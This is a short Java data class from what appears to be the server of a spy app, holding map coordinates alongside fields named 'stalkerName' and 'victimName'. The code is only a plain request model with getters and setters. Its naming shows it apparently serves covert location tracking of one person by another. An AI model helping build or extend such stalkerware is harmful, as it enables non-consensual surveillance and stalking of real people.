/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.requestresponsemodel.request;

public class UpdateCordinatesRequest {

    private String cordinatesx;
    private String cordinatesy;
    private String stalkerName;
    private String victimName;

    public UpdateCordinatesRequest(String cordinatesx, String cordinatesy, String stalkerName, String victimName) {
        this.cordinatesx = cordinatesx;
        this.cordinatesy = cordinatesy;
        this.stalkerName = stalkerName;
        this.victimName = victimName;
    }

    public UpdateCordinatesRequest(){}

    public String getCordinatesx() {
        return cordinatesx;
    }

    public void setCordinatesx(String cordinatesx) {
        this.cordinatesx = cordinatesx;
    }

    public String getCordinatesy() {
        return cordinatesy;
    }

    public void setCordinatesy(String cordinatesy) {
        this.cordinatesy = cordinatesy;
    }

    public String getStalkerName() {
        return stalkerName;
    }

    public void setStalkerName(String stalkerName) {
        this.stalkerName = stalkerName;
    }

    public String getVictimName() {
        return victimName;
    }

    public void setVictimName(String victimName) {
        this.victimName = victimName;
    }
}
